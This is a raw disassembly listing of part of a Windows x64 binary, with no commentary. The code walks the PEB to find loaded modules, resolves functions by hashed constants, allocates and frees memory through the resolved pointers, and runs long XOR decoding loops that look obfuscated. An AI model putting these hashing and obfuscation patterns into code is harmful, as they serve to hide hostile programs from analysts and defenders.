   1400054af:	4d 63 f6             	movslq %r14d,%r14
   1400054b2:	0f 1f 40 00          	nopl   0x0(%rax)
   1400054b6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   1400054bd:	00 00 00 
   1400054c0:	48 8b 4c 24 68       	mov    0x68(%rsp),%rcx
   1400054c5:	4c 8d 1c 13          	lea    (%rbx,%rdx,1),%r11
   1400054c9:	49 03 c3             	add    %r11,%rax
   1400054cc:	44 0f b6 d3          	movzbl %bl,%r10d
   1400054d0:	33 d2                	xor    %edx,%edx
   1400054d2:	4c 8b cb             	mov    %rbx,%r9
   1400054d5:	49 f7 f6             	div    %r14
   1400054d8:	48 8b c3             	mov    %rbx,%rax
   1400054db:	41 83 e1 1f          	and    $0x1f,%r9d
   1400054df:	44 0f b6 04 32       	movzbl (%rdx,%rsi,1),%r8d
   1400054e4:	33 d2                	xor    %edx,%edx
   1400054e6:	49 f7 f6             	div    %r14
   1400054e9:	48 8b c3             	mov    %rbx,%rax
   1400054ec:	48 ff c3             	inc    %rbx
   1400054ef:	83 e0 7f             	and    $0x7f,%eax
   1400054f2:	44 32 04 32          	xor    (%rdx,%rsi,1),%r8b
   1400054f6:	44 32 04 08          	xor    (%rax,%rcx,1),%r8b
   1400054fa:	48 8d 05 ff aa ff ff 	lea    -0x5501(%rip),%rax        # 0x140000000
   140005501:	45 32 84 01 20 70 00 	xor    0x7020(%r9,%rax,1),%r8b
   140005508:	00 
   140005509:	45 32 84 01 00 70 00 	xor    0x7000(%r9,%rax,1),%r8b
   140005510:	00 
   140005511:	45 32 04 3a          	xor    (%r10,%rdi,1),%r8b
   140005515:	48 8b 44 24 60       	mov    0x60(%rsp),%rax
   14000551a:	48 8b 55 40          	mov    0x40(%rbp),%rdx
   14000551e:	45 32 04 02          	xor    (%r10,%rax,1),%r8b
   140005522:	45 32 03             	xor    (%r11),%r8b
   140005525:	44 32 44 24 50       	xor    0x50(%rsp),%r8b
   14000552a:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
   14000552e:	45 88 03             	mov    %r8b,(%r11)
   140005531:	48 3b 5d 48          	cmp    0x48(%rbp),%rbx
   140005535:	72 89                	jb     0x1400054c0
   140005537:	48 8b 7d c0          	mov    -0x40(%rbp),%rdi
   14000553b:	eb 05                	jmp    0x140005542
   14000553d:	48 8b 7c 24 58       	mov    0x58(%rsp),%rdi
   140005542:	48 8b cf             	mov    %rdi,%rcx
   140005545:	e8 a6 04 00 00       	call   0x1400059f0
   14000554a:	48 8b 4c 24 60       	mov    0x60(%rsp),%rcx
   14000554f:	e8 9c 04 00 00       	call   0x1400059f0
   140005554:	48 8b 4c 24 68       	mov    0x68(%rsp),%rcx
   140005559:	e8 92 04 00 00       	call   0x1400059f0
   14000555e:	48 8b 4c 24 70       	mov    0x70(%rsp),%rcx
   140005563:	e8 88 04 00 00       	call   0x1400059f0
   140005568:	4c 8b bc 24 f8 00 00 	mov    0xf8(%rsp),%r15
   14000556f:	00 
   140005570:	4c 8b ac 24 00 01 00 	mov    0x100(%rsp),%r13
   140005577:	00 
   140005578:	4c 8b a4 24 08 01 00 	mov    0x108(%rsp),%r12
   14000557f:	00 
   140005580:	48 8b 9c 24 18 01 00 	mov    0x118(%rsp),%rbx
   140005587:	00 
   140005588:	48 8b bc 24 10 01 00 	mov    0x110(%rsp),%rdi
   14000558f:	00 
   140005590:	48 81 c4 20 01 00 00 	add    $0x120,%rsp
   140005597:	41 5e                	pop    %r14
   140005599:	5e                   	pop    %rsi
   14000559a:	5d                   	pop    %rbp
   14000559b:	c3                   	ret
   14000559c:	cc                   	int3
   14000559d:	cc                   	int3
   14000559e:	cc                   	int3
   14000559f:	cc                   	int3
   1400055a0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400055a5:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   1400055aa:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1400055af:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   1400055b4:	41 54                	push   %r12
   1400055b6:	41 56                	push   %r14
   1400055b8:	41 57                	push   %r15
   1400055ba:	48 83 ec 40          	sub    $0x40,%rsp
   1400055be:	8b 9c 24 98 00 00 00 	mov    0x98(%rsp),%ebx
   1400055c5:	49 8b f9             	mov    %r9,%rdi
   1400055c8:	48 8b b4 24 a8 00 00 	mov    0xa8(%rsp),%rsi
   1400055cf:	00 
   1400055d0:	8b c3                	mov    %ebx,%eax
   1400055d2:	4d 8b d8             	mov    %r8,%r11
   1400055d5:	4c 8b ca             	mov    %rdx,%r9
   1400055d8:	4c 8b c1             	mov    %rcx,%r8
   1400055db:	44 8d 53 03          	lea    0x3(%rbx),%r10d
   1400055df:	25 1f 00 00 80       	and    $0x8000001f,%eax
   1400055e4:	7d 07                	jge    0x1400055ed
   1400055e6:	ff c8                	dec    %eax
   1400055e8:	83 c8 e0             	or     $0xffffffe0,%eax
   1400055eb:	ff c0                	inc    %eax
   1400055ed:	4c 8b b4 24 a0 00 00 	mov    0xa0(%rsp),%r14
   1400055f4:	00 
   1400055f5:	4c 8d 25 04 aa ff ff 	lea    -0x55fc(%rip),%r12        # 0x140000000
   1400055fc:	48 63 e8             	movslq %eax,%rbp
   1400055ff:	8d 43 06             	lea    0x6(%rbx),%eax
   140005602:	99                   	cltd
   140005603:	f7 fe                	idiv   %esi
   140005605:	45 0f b6 bc 2c 00 70 	movzbl 0x7000(%r12,%rbp,1),%r15d
   14000560c:	00 00 
   14000560e:	8b c3                	mov    %ebx,%eax
   140005610:	48 63 ca             	movslq %edx,%rcx
   140005613:	99                   	cltd
   140005614:	f7 fe                	idiv   %esi
   140005616:	48 63 c2             	movslq %edx,%rax
   140005619:	42 0f b6 14 31       	movzbl (%rcx,%r14,1),%edx
   14000561e:	42 32 14 30          	xor    (%rax,%r14,1),%dl
   140005622:	41 8b c2             	mov    %r10d,%eax
   140005625:	25 ff 00 00 80       	and    $0x800000ff,%eax
   14000562a:	7d 09                	jge    0x140005635
   14000562c:	ff c8                	dec    %eax
   14000562e:	0d 00 ff ff ff       	or     $0xffffff00,%eax
   140005633:	ff c0                	inc    %eax
   140005635:	48 98                	cltq
   140005637:	42 32 14 08          	xor    (%rax,%r9,1),%dl
   14000563b:	41 81 e2 7f 00 00 80 	and    $0x8000007f,%r10d
   140005642:	7d 0a                	jge    0x14000564e
   140005644:	41 ff ca             	dec    %r10d
   140005647:	41 83 ca 80          	or     $0xffffff80,%r10d
   14000564b:	41 ff c2             	inc    %r10d
   14000564e:	49 63 c2             	movslq %r10d,%rax
   140005651:	42 32 14 18          	xor    (%rax,%r11,1),%dl
   140005655:	8b c3                	mov    %ebx,%eax
   140005657:	25 ff 00 00 80       	and    $0x800000ff,%eax
   14000565c:	7d 09                	jge    0x140005667
   14000565e:	ff c8                	dec    %eax
   140005660:	0d 00 ff ff ff       	or     $0xffffff00,%eax
   140005665:	ff c0                	inc    %eax
   140005667:	48 98                	cltq
   140005669:	32 14 38             	xor    (%rax,%rdi,1),%dl
   14000566c:	41 32 94 2c 20 70 00 	xor    0x7020(%r12,%rbp,1),%dl
   140005673:	00 
   140005674:	48 63 84 24 80 00 00 	movslq 0x80(%rsp),%rax
   14000567b:	00 
   14000567c:	41 32 d7             	xor    %r15b,%dl
   14000567f:	0f b6 ea             	movzbl %dl,%ebp
   140005682:	42 0f b6 14 00       	movzbl (%rax,%r8,1),%edx
   140005687:	48 63 84 24 88 00 00 	movslq 0x88(%rsp),%rax
   14000568e:	00 
   14000568f:	42 0f b6 0c 00       	movzbl (%rax,%r8,1),%ecx
   140005694:	8d 04 9b             	lea    (%rbx,%rbx,4),%eax
   140005697:	03 d1                	add    %ecx,%edx
   140005699:	03 d0                	add    %eax,%edx
   14000569b:	81 e2 ff 03 00 80    	and    $0x800003ff,%edx
   1400056a1:	7d 0a                	jge    0x1400056ad
   1400056a3:	ff ca                	dec    %edx
   1400056a5:	81 ca 00 fc ff ff    	or     $0xfffffc00,%edx
   1400056ab:	ff c2                	inc    %edx
   1400056ad:	8b 84 24 90 00 00 00 	mov    0x90(%rsp),%eax
   1400056b4:	4c 63 d2             	movslq %edx,%r10
   1400056b7:	25 ff 00 00 80       	and    $0x800000ff,%eax
   1400056bc:	7d 09                	jge    0x1400056c7
   1400056be:	ff c8                	dec    %eax
   1400056c0:	0d 00 ff ff ff       	or     $0xffffff00,%eax
   1400056c5:	ff c0                	inc    %eax
   1400056c7:	47 0f b6 14 02       	movzbl (%r10,%r8,1),%r10d
   1400056cc:	48 98                	cltq
   1400056ce:	42 0f b6 0c 08       	movzbl (%rax,%r9,1),%ecx
   1400056d3:	48 8d 04 69          	lea    (%rcx,%rbp,2),%rax
   1400056d7:	0f b6 c8             	movzbl %al,%ecx
   1400056da:	8b c3                	mov    %ebx,%eax
   1400056dc:	46 32 14 09          	xor    (%rcx,%r9,1),%r10b
   1400056e0:	25 7f 00 00 80       	and    $0x8000007f,%eax
   1400056e5:	7d 07                	jge    0x1400056ee
   1400056e7:	ff c8                	dec    %eax
   1400056e9:	83 c8 80             	or     $0xffffff80,%eax
   1400056ec:	ff c0                	inc    %eax
   1400056ee:	48 98                	cltq
   1400056f0:	48 89 74 24 38       	mov    %rsi,0x38(%rsp)
   1400056f5:	4c 89 74 24 30       	mov    %r14,0x30(%rsp)
   1400056fa:	48 89 7c 24 28       	mov    %rdi,0x28(%rsp)
   1400056ff:	42 0f b6 0c 18       	movzbl (%rax,%r11,1),%ecx
   140005704:	8d 43 0d             	lea    0xd(%rbx),%eax
   140005707:	99                   	cltd
   140005708:	4c 89 5c 24 20       	mov    %r11,0x20(%rsp)
   14000570d:	f7 fe                	idiv   %esi
   14000570f:	49 03 cf             	add    %r15,%rcx
   140005712:	83 e1 7f             	and    $0x7f,%ecx
   140005715:	48 63 c2             	movslq %edx,%rax
   140005718:	8b d3                	mov    %ebx,%edx
   14000571a:	46 32 14 19          	xor    (%rcx,%r11,1),%r10b
   14000571e:	46 32 14 30          	xor    (%rax,%r14,1),%r10b
   140005722:	41 0f b6 ca          	movzbl %r10b,%ecx
   140005726:	e8 85 e4 ff ff       	call   0x140003bb0
   14000572b:	6b d5 07             	imul   $0x7,%ebp,%edx
   14000572e:	02 c2                	add    %dl,%al
   140005730:	0f b6 c8             	movzbl %al,%ecx
   140005733:	c0 c9 07             	ror    $0x7,%cl
   140005736:	32 c8                	xor    %al,%cl
   140005738:	0f b6 d1             	movzbl %cl,%edx
   14000573b:	8d 04 13             	lea    (%rbx,%rdx,1),%eax
   14000573e:	25 ff 00 00 80       	and    $0x800000ff,%eax
   140005743:	7d 09                	jge    0x14000574e
   140005745:	ff c8                	dec    %eax
   140005747:	0d 00 ff ff ff       	or     $0xffffff00,%eax
   14000574c:	ff c0                	inc    %eax
   14000574e:	48 98                	cltq
   140005750:	02 14 38             	add    (%rax,%rdi,1),%dl
   140005753:	44 0f b6 c2          	movzbl %dl,%r8d
   140005757:	41 8b c8             	mov    %r8d,%ecx
   14000575a:	41 8d 04 18          	lea    (%r8,%rbx,1),%eax
   14000575e:	25 1f 00 00 80       	and    $0x8000001f,%eax
   140005763:	7d 07                	jge    0x14000576c
   140005765:	ff c8                	dec    %eax
   140005767:	83 c8 e0             	or     $0xffffffe0,%eax
   14000576a:	ff c0                	inc    %eax
   14000576c:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   140005771:	83 e1 1f             	and    $0x1f,%ecx
   140005774:	48 8b 6c 24 68       	mov    0x68(%rsp),%rbp
   140005779:	48 8b 74 24 70       	mov    0x70(%rsp),%rsi
   14000577e:	48 8b 7c 24 78       	mov    0x78(%rsp),%rdi
   140005783:	48 98                	cltq
   140005785:	42 0f b6 84 20 20 70 	movzbl 0x7020(%rax,%r12,1),%eax
   14000578c:	00 00 
   14000578e:	42 32 84 21 00 70 00 	xor    0x7000(%rcx,%r12,1),%al
   140005795:	00 
   140005796:	41 32 c0             	xor    %r8b,%al
   140005799:	48 83 c4 40          	add    $0x40,%rsp
   14000579d:	41 5f                	pop    %r15
   14000579f:	41 5e                	pop    %r14
   1400057a1:	41 5c                	pop    %r12
   1400057a3:	c3                   	ret
   1400057a4:	cc                   	int3
   1400057a5:	cc                   	int3
   1400057a6:	cc                   	int3
   1400057a7:	cc                   	int3
   1400057a8:	cc                   	int3
   1400057a9:	cc                   	int3
   1400057aa:	cc                   	int3
   1400057ab:	cc                   	int3
   1400057ac:	cc                   	int3
   1400057ad:	cc                   	int3
   1400057ae:	cc                   	int3
   1400057af:	cc                   	int3
   1400057b0:	b8 05 40 00 80       	mov    $0x80004005,%eax
   1400057b5:	c3                   	ret
   1400057b6:	cc                   	int3
   1400057b7:	cc                   	int3
   1400057b8:	cc                   	int3
   1400057b9:	cc                   	int3
   1400057ba:	cc                   	int3
   1400057bb:	cc                   	int3
   1400057bc:	cc                   	int3
   1400057bd:	cc                   	int3
   1400057be:	cc                   	int3
   1400057bf:	cc                   	int3
   1400057c0:	33 c0                	xor    %eax,%eax
   1400057c2:	c3                   	ret
   1400057c3:	cc                   	int3
   1400057c4:	cc                   	int3
   1400057c5:	cc                   	int3
   1400057c6:	cc                   	int3
   1400057c7:	cc                   	int3
   1400057c8:	cc                   	int3
   1400057c9:	cc                   	int3
   1400057ca:	cc                   	int3
   1400057cb:	cc                   	int3
   1400057cc:	cc                   	int3
   1400057cd:	cc                   	int3
   1400057ce:	cc                   	int3
   1400057cf:	cc                   	int3
   1400057d0:	48 8d 05 6b 18 00 00 	lea    0x186b(%rip),%rax        # 0x140007042
   1400057d7:	c3                   	ret
   1400057d8:	cc                   	int3
   1400057d9:	cc                   	int3
   1400057da:	cc                   	int3
   1400057db:	cc                   	int3
   1400057dc:	cc                   	int3
   1400057dd:	cc                   	int3
   1400057de:	cc                   	int3
   1400057df:	cc                   	int3
   1400057e0:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   1400057e5:	c3                   	ret
   1400057e6:	cc                   	int3
   1400057e7:	cc                   	int3
   1400057e8:	cc                   	int3
   1400057e9:	cc                   	int3
   1400057ea:	cc                   	int3
   1400057eb:	cc                   	int3
   1400057ec:	cc                   	int3
   1400057ed:	cc                   	int3
   1400057ee:	cc                   	int3
   1400057ef:	cc                   	int3
   1400057f0:	c2 00 00             	ret    $0x0
   1400057f3:	cc                   	int3
   1400057f4:	cc                   	int3
   1400057f5:	cc                   	int3
   1400057f6:	cc                   	int3
   1400057f7:	cc                   	int3
   1400057f8:	cc                   	int3
   1400057f9:	cc                   	int3
   1400057fa:	cc                   	int3
   1400057fb:	cc                   	int3
   1400057fc:	cc                   	int3
   1400057fd:	cc                   	int3
   1400057fe:	cc                   	int3
   1400057ff:	cc                   	int3
   140005800:	b8 ff ff 00 00       	mov    $0xffff,%eax
   140005805:	c3                   	ret
   140005806:	cc                   	int3
   140005807:	cc                   	int3
   140005808:	cc                   	int3
   140005809:	cc                   	int3
   14000580a:	cc                   	int3
   14000580b:	cc                   	int3
   14000580c:	cc                   	int3
   14000580d:	cc                   	int3
   14000580e:	cc                   	int3
   14000580f:	cc                   	int3
   140005810:	b0 ff                	mov    $0xff,%al
   140005812:	c3                   	ret
   140005813:	cc                   	int3
   140005814:	cc                   	int3
   140005815:	cc                   	int3
   140005816:	cc                   	int3
   140005817:	cc                   	int3
   140005818:	cc                   	int3
   140005819:	cc                   	int3
   14000581a:	cc                   	int3
   14000581b:	cc                   	int3
   14000581c:	cc                   	int3
   14000581d:	cc                   	int3
   14000581e:	cc                   	int3
   14000581f:	cc                   	int3
   140005820:	48 c7 c0 ff ff ff ff 	mov    $0xffffffffffffffff,%rax
   140005827:	c3                   	ret
   140005828:	cc                   	int3
   140005829:	cc                   	int3
   14000582a:	cc                   	int3
   14000582b:	cc                   	int3
   14000582c:	cc                   	int3
   14000582d:	cc                   	int3
   14000582e:	cc                   	int3
   14000582f:	cc                   	int3
   140005830:	b0 5a                	mov    $0x5a,%al
   140005832:	c3                   	ret
   140005833:	cc                   	int3
   140005834:	cc                   	int3
   140005835:	cc                   	int3
   140005836:	cc                   	int3
   140005837:	cc                   	int3
   140005838:	cc                   	int3
   140005839:	cc                   	int3
   14000583a:	cc                   	int3
   14000583b:	cc                   	int3
   14000583c:	cc                   	int3
   14000583d:	cc                   	int3
   14000583e:	cc                   	int3
   14000583f:	cc                   	int3
   140005840:	48 83 ec 28          	sub    $0x28,%rsp
   140005844:	e8 17 e3 ff ff       	call   0x140003b60
   140005849:	e8 12 e3 ff ff       	call   0x140003b60
   14000584e:	e8 0d e3 ff ff       	call   0x140003b60
   140005853:	e8 58 06 00 00       	call   0x140005eb0
   140005858:	85 c0                	test   %eax,%eax
   14000585a:	75 5e                	jne    0x1400058ba
   14000585c:	e8 ff e2 ff ff       	call   0x140003b60
   140005861:	e8 fa e2 ff ff       	call   0x140003b60
   140005866:	e8 f5 e2 ff ff       	call   0x140003b60
   14000586b:	e8 c0 0d 00 00       	call   0x140006630
   140005870:	85 c0                	test   %eax,%eax
   140005872:	75 46                	jne    0x1400058ba
   140005874:	e8 e7 e2 ff ff       	call   0x140003b60
   140005879:	e8 e2 e2 ff ff       	call   0x140003b60
   14000587e:	e8 dd e2 ff ff       	call   0x140003b60
   140005883:	e8 38 02 00 00       	call   0x140005ac0
   140005888:	48 8b c8             	mov    %rax,%rcx
   14000588b:	ba f1 85 18 25       	mov    $0x251885f1,%edx
   140005890:	e8 eb 02 00 00       	call   0x140005b80
   140005895:	48 85 c0             	test   %rax,%rax
   140005898:	75 25                	jne    0x1400058bf
   14000589a:	e8 c1 e2 ff ff       	call   0x140003b60
   14000589f:	e8 bc e2 ff ff       	call   0x140003b60
   1400058a4:	e8 b7 e2 ff ff       	call   0x140003b60
   1400058a9:	e8 b2 e2 ff ff       	call   0x140003b60
   1400058ae:	e8 2d 07 00 00       	call   0x140005fe0
   1400058b3:	33 c0                	xor    %eax,%eax
   1400058b5:	48 83 c4 28          	add    $0x28,%rsp
   1400058b9:	c3                   	ret
   1400058ba:	e8 a1 e2 ff ff       	call   0x140003b60
   1400058bf:	e8 9c e2 ff ff       	call   0x140003b60
   1400058c4:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   1400058c9:	48 83 c4 28          	add    $0x28,%rsp
   1400058cd:	c3                   	ret
   1400058ce:	cc                   	int3
   1400058cf:	cc                   	int3
   1400058d0:	48 8d 05 69 17 00 00 	lea    0x1769(%rip),%rax        # 0x140007040
   1400058d7:	c3                   	ret
   1400058d8:	cc                   	int3
   1400058d9:	cc                   	int3
   1400058da:	cc                   	int3
   1400058db:	cc                   	int3
   1400058dc:	cc                   	int3
   1400058dd:	cc                   	int3
   1400058de:	cc                   	int3
   1400058df:	cc                   	int3
   1400058e0:	b8 01 00 00 00       	mov    $0x1,%eax
   1400058e5:	c3                   	ret
   1400058e6:	cc                   	int3
   1400058e7:	cc                   	int3
   1400058e8:	cc                   	int3
   1400058e9:	cc                   	int3
   1400058ea:	cc                   	int3
   1400058eb:	cc                   	int3
   1400058ec:	cc                   	int3
   1400058ed:	cc                   	int3
   1400058ee:	cc                   	int3
   1400058ef:	cc                   	int3
   1400058f0:	b0 01                	mov    $0x1,%al
   1400058f2:	c3                   	ret
   1400058f3:	cc                   	int3
   1400058f4:	cc                   	int3
   1400058f5:	cc                   	int3
   1400058f6:	cc                   	int3
   1400058f7:	cc                   	int3
   1400058f8:	cc                   	int3
   1400058f9:	cc                   	int3
   1400058fa:	cc                   	int3
   1400058fb:	cc                   	int3
   1400058fc:	cc                   	int3
   1400058fd:	cc                   	int3
   1400058fe:	cc                   	int3
   1400058ff:	cc                   	int3
   140005900:	32 c0                	xor    %al,%al
   140005902:	c3                   	ret
   140005903:	cc                   	int3
   140005904:	cc                   	int3
   140005905:	cc                   	int3
   140005906:	cc                   	int3
   140005907:	cc                   	int3
   140005908:	cc                   	int3
   140005909:	cc                   	int3
   14000590a:	cc                   	int3
   14000590b:	cc                   	int3
   14000590c:	cc                   	int3
   14000590d:	cc                   	int3
   14000590e:	cc                   	int3
   14000590f:	cc                   	int3
   140005910:	b8 41 00 00 00       	mov    $0x41,%eax
   140005915:	c3                   	ret
   140005916:	cc                   	int3
   140005917:	cc                   	int3
   140005918:	cc                   	int3
   140005919:	cc                   	int3
   14000591a:	cc                   	int3
   14000591b:	cc                   	int3
   14000591c:	cc                   	int3
   14000591d:	cc                   	int3
   14000591e:	cc                   	int3
   14000591f:	cc                   	int3
   140005920:	b0 41                	mov    $0x41,%al
   140005922:	c3                   	ret
   140005923:	cc                   	int3
   140005924:	cc                   	int3
   140005925:	cc                   	int3
   140005926:	cc                   	int3
   140005927:	cc                   	int3
   140005928:	cc                   	int3
   140005929:	cc                   	int3
   14000592a:	cc                   	int3
   14000592b:	cc                   	int3
   14000592c:	cc                   	int3
   14000592d:	cc                   	int3
   14000592e:	cc                   	int3
   14000592f:	cc                   	int3
   140005930:	b8 0e 00 07 80       	mov    $0x8007000e,%eax
   140005935:	c3                   	ret
   140005936:	cc                   	int3
   140005937:	cc                   	int3
   140005938:	cc                   	int3
   140005939:	cc                   	int3
   14000593a:	cc                   	int3
   14000593b:	cc                   	int3
   14000593c:	cc                   	int3
   14000593d:	cc                   	int3
   14000593e:	cc                   	int3
   14000593f:	cc                   	int3
   140005940:	b8 05 00 07 80       	mov    $0x80070005,%eax
   140005945:	c3                   	ret
   140005946:	cc                   	int3
   140005947:	cc                   	int3
   140005948:	cc                   	int3
   140005949:	cc                   	int3
   14000594a:	cc                   	int3
   14000594b:	cc                   	int3
   14000594c:	cc                   	int3
   14000594d:	cc                   	int3
   14000594e:	cc                   	int3
   14000594f:	cc                   	int3
   140005950:	b8 57 00 07 80       	mov    $0x80070057,%eax
   140005955:	c3                   	ret
   140005956:	cc                   	int3
   140005957:	cc                   	int3
   140005958:	cc                   	int3
   140005959:	cc                   	int3
   14000595a:	cc                   	int3
   14000595b:	cc                   	int3
   14000595c:	cc                   	int3
   14000595d:	cc                   	int3
   14000595e:	cc                   	int3
   14000595f:	cc                   	int3
   140005960:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140005965:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000596a:	41 56                	push   %r14
   14000596c:	48 83 ec 20          	sub    $0x20,%rsp
   140005970:	48 8b d9             	mov    %rcx,%rbx
   140005973:	49 8b f1             	mov    %r9,%rsi
   140005976:	48 0f af da          	imul   %rdx,%rbx
   14000597a:	4d 8b f0             	mov    %r8,%r14
   14000597d:	e8 3e 01 00 00       	call   0x140005ac0
   140005982:	ba 39 d3 a4 30       	mov    $0x30a4d339,%edx
   140005987:	48 8b c8             	mov    %rax,%rcx
   14000598a:	e8 f1 01 00 00       	call   0x140005b80
   14000598f:	41 b9 04 00 00 00    	mov    $0x4,%r9d
   140005995:	41 b8 00 30 00 00    	mov    $0x3000,%r8d
   14000599b:	48 8b d3             	mov    %rbx,%rdx
   14000599e:	33 c9                	xor    %ecx,%ecx
   1400059a0:	ff d0                	call   *%rax
   1400059a2:	48 8b d0             	mov    %rax,%rdx
   1400059a5:	48 85 c0             	test   %rax,%rax
   1400059a8:	75 16                	jne    0x1400059c0
   1400059aa:	b8 08 00 00 00       	mov    $0x8,%eax
   1400059af:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   1400059b4:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   1400059b9:	48 83 c4 20          	add    $0x20,%rsp
   1400059bd:	41 5e                	pop    %r14
   1400059bf:	c3                   	ret
   1400059c0:	48 89 7c 24 30       	mov    %rdi,0x30(%rsp)
   1400059c5:	48 8b cb             	mov    %rbx,%rcx
   1400059c8:	48 8b fa             	mov    %rdx,%rdi
   1400059cb:	33 c0                	xor    %eax,%eax
   1400059cd:	f3 aa                	rep stos %al,(%rdi)
   1400059cf:	48 8b 7c 24 30       	mov    0x30(%rsp),%rdi
   1400059d4:	48 89 1e             	mov    %rbx,(%rsi)
   1400059d7:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   1400059dc:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   1400059e1:	49 89 16             	mov    %rdx,(%r14)
   1400059e4:	48 83 c4 20          	add    $0x20,%rsp
   1400059e8:	41 5e                	pop    %r14
   1400059ea:	c3                   	ret
   1400059eb:	cc                   	int3
   1400059ec:	cc                   	int3
   1400059ed:	cc                   	int3
   1400059ee:	cc                   	int3
   1400059ef:	cc                   	int3
   1400059f0:	40 53                	rex push %rbx
   1400059f2:	48 83 ec 20          	sub    $0x20,%rsp
   1400059f6:	48 8b d9             	mov    %rcx,%rbx
   1400059f9:	e8 c2 00 00 00       	call   0x140005ac0
   1400059fe:	ba b2 61 ec 7d       	mov    $0x7dec61b2,%edx
   140005a03:	48 8b c8             	mov    %rax,%rcx
   140005a06:	e8 75 01 00 00       	call   0x140005b80
   140005a0b:	33 d2                	xor    %edx,%edx
   140005a0d:	41 b8 00 80 00 00    	mov    $0x8000,%r8d
   140005a13:	48 8b cb             	mov    %rbx,%rcx
   140005a16:	48 83 c4 20          	add    $0x20,%rsp
   140005a1a:	5b                   	pop    %rbx
   140005a1b:	48 ff e0             	rex.W jmp *%rax
   140005a1e:	cc                   	int3
   140005a1f:	cc                   	int3
   140005a20:	0f b7 01             	movzwl (%rcx),%eax
   140005a23:	66 85 c0             	test   %ax,%ax
   140005a26:	74 16                	je     0x140005a3e
   140005a28:	66 3b 02             	cmp    (%rdx),%ax
   140005a2b:	75 11                	jne    0x140005a3e
   140005a2d:	0f b7 41 02          	movzwl 0x2(%rcx),%eax
   140005a31:	48 83 c1 02          	add    $0x2,%rcx
   140005a35:	48 83 c2 02          	add    $0x2,%rdx
   140005a39:	66 85 c0             	test   %ax,%ax
   140005a3c:	75 ea                	jne    0x140005a28
   140005a3e:	0f b7 01             	movzwl (%rcx),%eax
   140005a41:	0f b7 0a             	movzwl (%rdx),%ecx
   140005a44:	2b c1                	sub    %ecx,%eax
   140005a46:	c3                   	ret
   140005a47:	cc                   	int3
   140005a48:	cc                   	int3
   140005a49:	cc                   	int3
   140005a4a:	cc                   	int3
   140005a4b:	cc                   	int3
   140005a4c:	cc                   	int3
   140005a4d:	cc                   	int3
   140005a4e:	cc                   	int3
   140005a4f:	cc                   	int3
   140005a50:	48 85 c9             	test   %rcx,%rcx
   140005a53:	75 03                	jne    0x140005a58
   140005a55:	33 c0                	xor    %eax,%eax
   140005a57:	c3                   	ret
   140005a58:	80 39 00             	cmpb   $0x0,(%rcx)
   140005a5b:	48 8b c1             	mov    %rcx,%rax
   140005a5e:	74 08                	je     0x140005a68
   140005a60:	48 ff c0             	inc    %rax
   140005a63:	80 38 00             	cmpb   $0x0,(%rax)
   140005a66:	75 f8                	jne    0x140005a60
   140005a68:	48 2b c1             	sub    %rcx,%rax
   140005a6b:	c3                   	ret
   140005a6c:	cc                   	int3
   140005a6d:	cc                   	int3
   140005a6e:	cc                   	int3
   140005a6f:	cc                   	int3
   140005a70:	48 89 74 24 08       	mov    %rsi,0x8(%rsp)
   140005a75:	48 89 7c 24 10       	mov    %rdi,0x10(%rsp)
   140005a7a:	48 8b c1             	mov    %rcx,%rax
   140005a7d:	48 8b f9             	mov    %rcx,%rdi
   140005a80:	49 8b c8             	mov    %r8,%rcx
   140005a83:	48 8b f2             	mov    %rdx,%rsi
   140005a86:	f3 a4                	rep movsb (%rsi),(%rdi)
   140005a88:	48 8b 74 24 08       	mov    0x8(%rsp),%rsi
   140005a8d:	48 8b 7c 24 10       	mov    0x10(%rsp),%rdi
   140005a92:	c3                   	ret
   140005a93:	cc                   	int3
   140005a94:	cc                   	int3
   140005a95:	cc                   	int3
   140005a96:	cc                   	int3
   140005a97:	cc                   	int3
   140005a98:	cc                   	int3
   140005a99:	cc                   	int3
   140005a9a:	cc                   	int3
   140005a9b:	cc                   	int3
   140005a9c:	cc                   	int3
   140005a9d:	cc                   	int3
   140005a9e:	cc                   	int3
   140005a9f:	cc                   	int3
   140005aa0:	48 89 7c 24 08       	mov    %rdi,0x8(%rsp)
   140005aa5:	4c 8b c9             	mov    %rcx,%r9
   140005aa8:	48 8b f9             	mov    %rcx,%rdi
   140005aab:	0f b6 c2             	movzbl %dl,%eax
   140005aae:	49 8b c8             	mov    %r8,%rcx
   140005ab1:	f3 aa                	rep stos %al,(%rdi)
   140005ab3:	48 8b 7c 24 08       	mov    0x8(%rsp),%rdi
   140005ab8:	49 8b c1             	mov    %r9,%rax
   140005abb:	c3                   	ret
   140005abc:	cc                   	int3
   140005abd:	cc                   	int3
   140005abe:	cc                   	int3
   140005abf:	cc                   	int3
   140005ac0:	65 48 8b 04 25 60 00 	mov    %gs:0x60,%rax
   140005ac7:	00 00 
   140005ac9:	48 85 c0             	test   %rax,%rax
   140005acc:	74 4b                	je     0x140005b19
   140005ace:	4c 8b 40 18          	mov    0x18(%rax),%r8
   140005ad2:	4d 85 c0             	test   %r8,%r8
   140005ad5:	74 42                	je     0x140005b19
   140005ad7:	49 8b 40 20          	mov    0x20(%r8),%rax
   140005adb:	49 83 c0 20          	add    $0x20,%r8
   140005adf:	33 c9                	xor    %ecx,%ecx
   140005ae1:	49 3b c0             	cmp    %r8,%rax
   140005ae4:	74 33                	je     0x140005b19
   140005ae6:	45 33 c9             	xor    %r9d,%r9d
   140005ae9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140005af0:	48 8b 50 20          	mov    0x20(%rax),%rdx
   140005af4:	48 85 d2             	test   %rdx,%rdx
   140005af7:	74 05                	je     0x140005afe
   140005af9:	83 f9 02             	cmp    $0x2,%ecx
   140005afc:	74 1e                	je     0x140005b1c
   140005afe:	48 8b 00             	mov    (%rax),%rax
   140005b01:	49 3b c0             	cmp    %r8,%rax
